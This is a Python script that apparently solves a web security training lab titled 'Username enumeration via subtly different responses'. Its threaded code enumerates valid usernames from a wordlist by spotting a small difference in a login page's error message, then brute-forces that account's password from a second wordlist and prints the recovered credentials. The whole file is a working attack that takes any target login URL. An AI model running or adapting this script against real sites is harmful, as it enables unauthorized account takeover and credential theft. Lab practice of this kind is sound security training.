import requests
import signal
import sys
import getopt
import re
import concurrent.futures
from halo import Halo


# Handle Ctrl+c
def signal_handler(signum, frame):
  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit(0)


# Call the function to handle Ctrl+c
signal.signal(signal.SIGINT, signal_handler)


def get_username(url, session):
  usernames = open('./usernames.txt', 'r')
  # Regex for error message in response
  regex = r'-warning>(.*?)</p>'

  def test_usernames(username):
    username = username.strip()
    data = {'username': username, 
            'password': 'a'}
    response = session.post(url, data=data)
    response_text = response.text
    error_message = re.search(regex, response_text).group(1)    
    
    if "." not in error_message:
      valid_username = username
      return valid_username
    else:
      return None

  with concurrent.futures.ThreadPoolExecutor() as executor:
    results = [executor.submit(test_usernames, username) for username in usernames]

    for i in concurrent.futures.as_completed(results):
      if i.result() != None:
        valid_username = i.result()
        usernames.close()
        return valid_username


def get_password(url, session, valid_username):
  passwords = open('./passwords.txt', 'r')

  def test_passwords(password):
    password = password.strip()
    data = {'username': valid_username,
            'password': password}
    response = session.post(url, data=data)
    response_text = response.text

    if "Invalid username or password" not in response_text:
      valid_password = password
      return valid_password
    else:
      return None

  with concurrent.futures.ThreadPoolExecutor() as executor:
    results = [executor.submit(test_passwords, password) for password in passwords]

    for i in concurrent.futures.as_completed(results):
      if i.result() != None:
        valid_password = i.result()
        passwords.close()
        return valid_password


def main(argv):
  help_message = "This is the script for:\n'Username enumeration via subtly different responses'\n\nUsage: python3 auth-2.py -u <url>/login"

  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print(help_message)
    print("\x1b[?25h", end="") # Make cursor visible
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
    elif opt == "-h":
      print(help_message)
      print("\x1b[?25h", end="") # Make cursor visible
      sys.exit()

  session = requests.Session()

  # Create and start spinner animation
  spinner = Halo(text='Testing usernames...', spinner='bouncingBar')
  spinner.start()
  # Get valid username
  username = get_username(url, session)
  # Finish spinner
  spinner.succeed(f"The username is: \"{username}\"")

  # Create and start spinner animation
  spinner = Halo(text='Testing passwords...', spinner='bouncingBar')
  spinner.start()
  # Get valid password
  password = get_password(url, session, username)
  # Finish spinner
  spinner.succeed(f"The password is: \"{password}\"")


if __name__ == "__main__":
  print("\x1b[?25l", end="") # Hide cursor

  main(sys.argv[1:])

  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit()